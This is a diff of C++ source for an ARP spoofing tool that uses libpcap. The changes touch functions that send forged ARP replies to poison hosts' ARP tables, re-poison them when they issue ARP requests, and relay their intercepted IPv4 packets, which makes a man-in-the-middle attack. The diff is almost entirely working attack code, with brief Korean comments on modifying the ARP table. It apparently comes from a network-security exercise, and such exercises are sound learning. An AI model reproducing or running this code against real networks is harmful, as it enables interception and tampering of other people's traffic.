@@ -32,38 +32,13 @@ struct EthIpPacket final {
 };
 #pragma pack(pop)
 
-map<Ip, Mac> senderIpMacMap = map<Ip, Mac>();
+map<Ip, Mac> IpMacMap = map<Ip, Mac>();
 
 Ip key_value_exists(const std::multimap<Ip, Ip>& mmap, Ip key, Ip value) {
     auto range = mmap.equal_range(key);
 
     for (auto it = range.first; it != range.second; ++it) if (it->second == value) return value;
     return Ip("127.1.1.1");
-}
-
-Ip get_gateway_for_interface(const char* interface) {
-    std::string command = "ip route show dev " + string(interface);
-    FILE *fp = popen(command.c_str(), "r");
-    if (fp == NULL) {
-        perror("popen");
-        return Ip("127.0.0.1");
-    }
-
-    char line[256];
-    while (fgets(line, sizeof(line), fp) != NULL) {
-        char *gateway = strstr(line, "via ");
-        if (gateway) {
-            gateway += 4; // Skip "via " part
-            char *end = strchr(gateway, ' ');
-            if (end) {
-                *end = '\0'; // Null-terminate the gateway IP address
-                return Ip(gateway);
-            }
-        }
-    }
-
-    pclose(fp);
-	return Ip("127.0.0.1");
 }
 
 Mac getMyMac(const char* interfaceName) {
@@ -133,6 +108,8 @@ Ip getMyIp(const char* interfaceName) {
 }
 
 Mac resolveMacAddrFromSendArp(pcap_t* handle, const Ip senderIP, const Mac senderMac, const Ip targetIP, int timeout = 3000) {
+	
+
 	EthArpPacket packet;
 	// * 1. send ARP request to get MAC address of ip_str
 	packet.eth_.dmac_ = Mac::broadcastMac();
@@ -144,6 +121,7 @@ Mac resolveMacAddrFromSendArp(pcap_t* handle, const Ip senderIP, const Mac sende
 	packet.arp_.hln_ = Mac::SIZE;
 	packet.arp_.pln_ = Ip::SIZE;
 	packet.arp_.op_ = htons(ArpHdr::Request);
+
 	packet.arp_.smac_ = senderMac;
 	packet.arp_.sip_ = htonl(senderIP);
 	packet.arp_.tmac_ = Mac::nullMac();
@@ -156,6 +134,7 @@ Mac resolveMacAddrFromSendArp(pcap_t* handle, const Ip senderIP, const Mac sende
 		
         return Mac::nullMac();	
     }
+
 
 	clock_t start = clock();
 	
@@ -192,23 +171,25 @@ Mac resolveMacAddrFromSendArp(pcap_t* handle, const Ip senderIP, const Mac sende
 
 void send_arp_attack_packet(pcap_t* handle, const Ip senderIP, const Ip targetIp, Mac myMac) {
 	Mac senderMac;
+	Mac targetMac;
 
-	if (senderIpMacMap.find(senderIP) == senderIpMacMap.end()) {
+
+	if (IpMacMap.find(senderIP) == IpMacMap.end()) {
 		// 1차 ARP Table 수정
+		
 		senderMac = resolveMacAddrFromSendArp(handle, targetIp, myMac, senderIP);
 		if (senderMac.isNull()) {
 			printf("Faild Get Mac Address(%s)\n", string(senderIP).c_str());
 			return;
 		}
 
-		senderIpMacMap[senderIP] = senderMac;
+		IpMacMap[senderIP] = senderMac;
 	}
 
-	
 	// 2차 ARP Table 수정
 	EthArpPacket packet;
 
-	packet.eth_.dmac_ = senderIpMacMap[senderIP];
+	packet.eth_.dmac_ = IpMacMap[senderIP];
 	packet.eth_.smac_ = myMac;
 	packet.eth_.type_ = htons(EthHdr::Arp);
 
@@ -219,7 +200,7 @@ void send_arp_attack_packet(pcap_t* handle, const Ip senderIP, const Ip targetIp
 	packet.arp_.op_ = htons(ArpHdr::Reply);
 	packet.arp_.smac_ = myMac;
 	packet.arp_.sip_ = htonl(targetIp);
-	packet.arp_.tmac_ = senderIpMacMap[senderIP];
+	packet.arp_.tmac_ = IpMacMap[senderIP];
 	packet.arp_.tip_ = htonl(senderIP);
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
@@ -260,6 +241,7 @@ int main(int argc, char* argv[]) {
 
 	clock_t last_send = clock();
 	for (const auto& [sender, target] : senderTargetMap) {
+		printf("%s %s\n", string(sender).c_str(), string(target).c_str());
 		send_arp_attack_packet(handle, sender, target, myMac);
 	}
 	
@@ -284,7 +266,7 @@ int main(int argc, char* argv[]) {
 					EthArpPacket* receivedPacket = (EthArpPacket*)replyPacket;
 					Ip sender = ntohl(receivedPacket->arp_.sip_);
 					Ip target = ntohl(receivedPacket->arp_.tip_);
-					
+
 					if (senderTargetMap.find(sender) != senderTargetMap.end()) {
 						auto range = senderTargetMap.equal_range(sender);
 						auto lower = range.first;
@@ -294,25 +276,11 @@ int main(int argc, char* argv[]) {
 							if (it->second == target) {
 								printf("Update Arp Table %s -> %s\n", string(it->first).c_str(), string(it->second).c_str());
 								send_arp_attack_packet(handle, sender, target, myMac);
-								
 								break;
 							}
 						}
 					}
-
-					if (senderTargetMap.find(target) != senderTargetMap.end()) {
-						auto range = senderTargetMap.equal_range(target);
-						auto lower = range.first;
-						auto upper = range.second;
-
-						for (auto it = lower; it != upper; ++it) {
-							if (it->second == target) {
-								printf("Update Arp Table %s -> %s\n", string(it->first).c_str(), string(it->second).c_str());
-								send_arp_attack_packet(handle, sender, target, myMac);
-								break;
-							}
-						}
-					}
+					// target이 sender에게 보내는 요청의 경우 매개변수로 두가지 방향 모두 입력되기에 sender 목록에 존재함.
 				}
 				break;
 			case EthHdr::Ip4:
@@ -325,14 +293,10 @@ int main(int argc, char* argv[]) {
 					if (!key_value_exists(senderTargetMap, sender, target)) break;
 					
 					printf("CatchPacket: %s -> %s\n", string(sender).c_str(), string(target).c_str());
-					
-					Mac dmac = resolveMacAddrFromSendArp(handle, myIp, myMac, target);
 
 					receivedPacketIp->eth_.smac_ = myMac; 
-					receivedPacketIp->eth_.dmac_ = dmac;
-					receivedPacketIp->ip_.src_ip_ = myIp;
-					receivedPacketIp->ip_.dst_ip_ = target;
-
+					receivedPacketIp->eth_.dmac_ = IpMacMap[target];
+					
 					int packetLen = receivedPacketIp->ip_.total_length_;
 
 					int res = pcap_sendpacket(handle, (const u_char*)receivedPacketIp, sizeof(EthHdr)+packetLen);
@@ -350,7 +314,6 @@ int main(int argc, char* argv[]) {
 				
 				}
 				
-
 				break;
 		}
 		
@@ -364,7 +327,6 @@ int main(int argc, char* argv[]) {
 		}
 
 	}
-
 	
 	pcap_close(handle);
 }
